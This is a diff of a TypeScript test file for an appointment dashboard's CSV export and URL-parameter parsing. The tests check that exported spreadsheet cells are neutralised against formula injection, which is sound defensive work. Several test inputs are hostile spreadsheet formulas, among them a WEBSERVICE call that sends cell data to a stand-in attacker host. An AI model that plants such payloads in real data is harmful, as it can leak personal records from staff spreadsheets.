@@ -4,6 +4,7 @@ import {
   filterAppointments,
   filtersToQueryString,
   parseDashboardFilters,
+  urlSearchParamsToRecord,
   MAX_SEARCH_LENGTH,
 } from "@/lib/dashboard-filters";
 import { APPOINTMENT_SPECIALTIES, APPOINTMENT_STATUSES } from "@/lib/validation";
@@ -181,9 +182,11 @@ describe("appointmentsToCsv", () => {
         status: "confirmed",
       }),
     ]);
+    // The +leading international phone gains the apostrophe text-marker
+    // (the session-36 formula guard) — displays verbatim, never evaluates.
     expect(csv).toBe(
       "Requested at,Full name,Phone,Email,Specialty,Preferred date,Status\r\n" +
-        "2026-10-01T10:30:00.000Z,James Okafor,+1 555 010 0002,,Family care,,confirmed\r\n",
+        "2026-10-01T10:30:00.000Z,James Okafor,'+1 555 010 0002,,Family care,,confirmed\r\n",
     );
   });
 
@@ -211,6 +214,113 @@ describe("appointmentsToCsv", () => {
     expect(lines[1]).toContain("Maria Sanchez");
     expect(lines[2]).toContain("B");
     expect(csv.endsWith("\r\n")).toBe(true);
+  });
+});
+
+describe("appointmentsToCsv — spreadsheet formula guard (session-36, OWASP CSV-injection class)", () => {
+  /* The public form accepts any 3–120-char fullName (no charset rule), any
+   * 7–32-char phone, and emails whose local part may start with a formula
+   * character. A staff member opening the exported attachment in a
+   * spreadsheet app must never have a cell EVALUATED as a formula — the
+   * OWASP neutralization: cells leading with = + - @ tab CR gain an
+   * apostrophe text-marker (hidden in display by Excel / LibreOffice /
+   * Sheets — the value still displays verbatim). */
+  const dataLine = (csv: string) => csv.split("\r\n")[1];
+
+  it("neutralizes a leading = (the WEBSERVICE exfiltration payload)", () => {
+    const csv = appointmentsToCsv([
+      row({ fullName: '=WEBSERVICE("http://evil.example/?leak="&B2)' }),
+    ]);
+    expect(dataLine(csv)).toContain("'=WEBSERVICE");
+    expect(dataLine(csv)).not.toMatch(/(^|,)=WEBSERVICE/);
+  });
+
+  it("neutralizes +, -, @, tab, and CR leading characters", () => {
+    const cases: Array<[string, string]> = [
+      ["+SUM(B2:B9)", "'+SUM(B2:B9)"],
+      ["-2+3|cmd", "'-2+3|cmd"],
+      ["@SUM(B2:B9)", "'@SUM(B2:B9)"],
+      ["\tTAB-led", "'\tTAB-led"],
+      ["\rCR-led", "'\rCR-led"],
+    ];
+    for (const [payload, expected] of cases) {
+      const csv = appointmentsToCsv([row({ id: "r2", fullName: payload })]);
+      expect(dataLine(csv)).toContain(expected);
+    }
+  });
+
+  it("guards a +leading international phone (the common real-world case)", () => {
+    const csv = appointmentsToCsv([row({ phone: "+65 6555 0134" })]);
+    expect(dataLine(csv)).toContain("'+65 6555 0134");
+  });
+
+  it("composes with RFC 4180 quoting — the apostrophe lands inside the quotes", () => {
+    const csv = appointmentsToCsv([
+      row({ fullName: '=HYPERLINK("http://evil.example","Click")' }),
+    ]);
+    // The comma + quotes force quoting; the guard prefix is INSIDE the
+    // quoted field, so the parsed cell value starts with the text marker.
+    expect(dataLine(csv)).toContain('"\'=HYPERLINK(""http://evil.example"",""Click"")"');
+  });
+
+  it("leaves ordinary values byte-identical (digits, letters, spaces)", () => {
+    const csv = appointmentsToCsv([
+      row({ fullName: "Maria Sanchez", phone: "555-0171", email: null, preferredDate: "2026-11-04" }),
+    ]);
+    expect(dataLine(csv)).toContain("Maria Sanchez");
+    expect(dataLine(csv)).toContain("555-0171");
+    expect(dataLine(csv)).toContain("2026-11-04");
+    expect(dataLine(csv)).not.toContain("'");
+  });
+
+  it("does not double-guard a value that already leads with an apostrophe", () => {
+    const csv = appointmentsToCsv([row({ fullName: "'Maria" })]);
+    expect(dataLine(csv)).toContain("'Maria");
+    expect(dataLine(csv)).not.toContain("''Maria");
+  });
+});
+
+describe("urlSearchParamsToRecord", () => {
+  /* Session-36 (F5): the export route used Object.fromEntries(url.searchParams)
+   * — which collapses repeated keys to the LAST value — while the dashboard
+   * page (Next searchParams → firstValue) takes the FIRST. A hand-crafted
+   * ?status=new&status=completed URL rendered the table with "new" but
+   * exported "completed", breaking the "export always matches the visible
+   * view" contract. The seam now owns the conversion so BOTH surfaces are
+   * first-wins by construction. */
+  it("returns an empty record for an empty param bag", () => {
+    expect(urlSearchParamsToRecord(new URLSearchParams(""))).toEqual({});
+  });
+
+  it("collects single values as single-element arrays", () => {
+    expect(urlSearchParamsToRecord(new URLSearchParams("status=new&search=maria"))).toEqual({
+      status: ["new"],
+      search: ["maria"],
+    });
+  });
+
+  it("preserves occurrence order for repeated keys", () => {
+    expect(urlSearchParamsToRecord(new URLSearchParams("status=new&status=completed"))).toEqual({
+      status: ["new", "completed"],
+    });
+  });
+
+  it("round-trips through parseDashboardFilters FIRST-WINS (the contract pin)", () => {
+    const record = urlSearchParamsToRecord(
+      new URLSearchParams("status=new&status=completed"),
+    );
+    expect(parseDashboardFilters(record)).toEqual({ status: "new" });
+  });
+
+  it("keeps the plain single-key round-trip byte-identical to the form path", () => {
+    const record = urlSearchParamsToRecord(
+      new URLSearchParams("status=completed&specialty=Family+care&search=okafor"),
+    );
+    expect(parseDashboardFilters(record)).toEqual({
+      status: "completed",
+      specialty: "Family care",
+      search: "okafor",
+    });
   });
 });
 
